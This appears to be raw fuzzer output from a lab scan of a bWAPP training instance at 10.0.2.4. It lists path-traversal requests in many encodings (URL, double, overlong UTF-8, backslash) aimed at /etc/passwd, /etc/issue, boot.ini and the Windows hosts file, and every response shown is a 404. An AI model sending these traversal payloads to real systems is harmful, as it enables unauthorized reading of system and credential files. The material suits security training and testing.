7976,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
7949,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e\%2e%2e\etc\passwd
7979,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
7981,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
7982,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue
7980,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
7978,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue
7983,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
7986,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue
7987,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
7985,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
7984,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
7996,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
7997,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5cetc%5cpasswd
7988,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
7989,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
7990,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue
7991,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini
7608,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts
7993,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5cetc%5cpasswd
7994,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5cetc%5cissue
7995,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5cboot.ini
7992,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts
8000,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
7999,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5cboot.ini
7998,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5cetc%5cissue
8001,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
7632,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%af..../%c1%af..../%c1%af..../%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts
8005,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
8010,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cissue
8003,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
8004,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
8002,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cissue
8006,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cissue
8009,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
8008,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
8007,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
8014,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cissue
8013,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd
8011,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
8012,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
7629,404,9L,39W,http://10.0.2.4/bWAPP/..../%c1%af..../%c1%af..../%c1%af..../%c1%af..../%c1%af..../%c1%afetc%c1%afpasswd
8018,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2fetc0x2fissue
8016,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
8017,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2fetc0x2fpasswd
8019,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2fboot.ini
8015,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
8021,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2fetc0x2fpasswd
8023,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2fboot.ini
8022,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2fetc0x2fissue
8020,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts
8025,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fetc0x2fpasswd
8027,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fboot.ini
8026,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fetc0x2fissue
8028,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts
8024,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts
8029,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fetc0x2fpasswd
8032,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts
8033,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fetc0x2fpasswd
8031,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fboot.ini
8034,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fetc0x2fissue
8030,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fetc0x2fissue
8035,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fboot.ini
8036,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts
8037,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fetc0x2fpasswd
8038,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fetc0x2fissue
8039,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fboot.ini
8040,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2f%2e%2e0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts
8041,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5cetc0x5cpasswd
8042,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5cetc0x5cissue
8043,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5cboot.ini
8049,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cetc0x5cpasswd
8048,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
8046,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5cetc0x5cissue
8047,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5cboot.ini
8045,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5cetc0x5cpasswd
8044,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
8052,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
8050,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cetc0x5cissue
8051,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cboot.ini
8056,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
8055,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cboot.ini
8054,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cetc0x5cissue
8057,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cetc0x5cpasswd
8053,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cetc0x5cpasswd
8069,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252fetc%252fpasswd
8063,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cboot.ini
8065,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252fetc%252fpasswd
8058,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cetc0x5cissue
8067,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252fboot.ini
8066,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252fetc%252fissue
8061,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cetc0x5cpasswd
8068,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
8064,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
8062,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cetc0x5cissue
8059,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cboot.ini
8060,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5c%2e%2e0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
8071,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252fboot.ini
8072,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
8073,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fpasswd
8070,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252fetc%252fissue
8074,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fissue
8076,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
8075,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252fboot.ini
8077,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fpasswd
8078,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fissue
8079,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fboot.ini
8082,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fissue
8083,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fboot.ini
8085,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fpasswd
8080,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
8081,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fpasswd
8084,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
8089,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255cetc%255cpasswd
8088,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
8087,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fboot.ini
8086,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252f%2e%2e%252fetc%252fissue
8091,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255cboot.ini
8090,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255cetc%255cissue
8093,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255cetc%255cpasswd
8092,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
8094,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255cetc%255cissue
8096,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
8095,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255cboot.ini
8097,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255cetc%255cpasswd
8098,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255cetc%255cissue
8099,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255cboot.ini
8104,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
8101,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255cetc%255cpasswd
8102,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255cetc%255cissue
8106,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255cetc%255cissue
8100,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
8105,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255cetc%255cpasswd
8103,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255cboot.ini
8108,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
8107,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255cboot.ini
8109,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255cetc%255cpasswd
8110,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255cetc%255cissue
8111,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255cboot.ini
8112,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
8113,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2fetc%c0%2fpasswd
8114,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2fetc%c0%2fissue
8115,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2fboot.ini
8118,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2fetc%c0%2fissue
8120,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
8119,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2fboot.ini
8116,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
8121,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fetc%c0%2fpasswd
8117,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2fetc%c0%2fpasswd
8123,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fboot.ini
8122,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fetc%c0%2fissue
8128,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
8124,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
8126,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fetc%c0%2fissue
8130,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fetc%c0%2fissue
8127,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fboot.ini
8125,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fetc%c0%2fpasswd
8131,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fboot.ini
8129,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fetc%c0%2fpasswd
8132,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
8133,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fetc%c0%2fpasswd
8136,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
8135,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fboot.ini
8137,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%afetc%c0%afpasswd
8134,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2f%2e%2e%c0%2fetc%c0%2fissue
8138,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%afetc%c0%afissue
8139,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%afboot.ini
8140,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
8141,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%afetc%c0%afpasswd
8147,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afboot.ini
8145,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%c0%afpasswd
8149,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%c0%afpasswd
8144,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
8143,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%afboot.ini
8146,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%c0%afissue
8142,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%afetc%c0%afissue
8150,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%c0%afissue
8148,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
8151,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afboot.ini
8153,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%c0%afpasswd
8152,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
8155,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afboot.ini
8156,404,9L,39W,http://10.0.2.4/bWAPP/%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
